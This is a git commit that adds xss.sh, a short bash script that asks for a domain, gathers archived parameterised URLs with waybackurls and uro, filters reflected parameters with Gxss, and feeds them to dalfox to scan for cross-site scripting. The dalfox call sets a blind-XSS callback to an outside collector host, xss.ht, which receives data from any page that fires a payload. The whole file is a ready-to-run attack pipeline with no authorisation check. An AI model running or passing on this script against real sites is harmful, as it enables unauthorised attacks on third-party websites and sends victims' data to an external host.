c862fd8ea0a4652e87740473e801b4cef562e7d8
Vijaysutar744825 <40523063+Vijaysutar744825@users.noreply.github.com>
2022-07-02 20:27:12 +0530

    Create xss.sh

---
+++ xss.sh
@@ -0,0 +1,14 @@
+echo "Enter your Domain Name:::"
+read s
+
+
+waybackurls $s | grep "=" | sort -u | uniq | tee -a urls.txt
+
+cat urls.txt | uro | tee -a clean.txt
+
+cat clean.txt | Gxss -p test | tee xss.txt  
+
+
+rm -rf urls.txt clean.txt 
+
+cat xss.txt | dalfox pipe --skip-mining-dict --delay 3 --silence -w 50 --skip-mining-all -b https://vvsutar.xss.ht
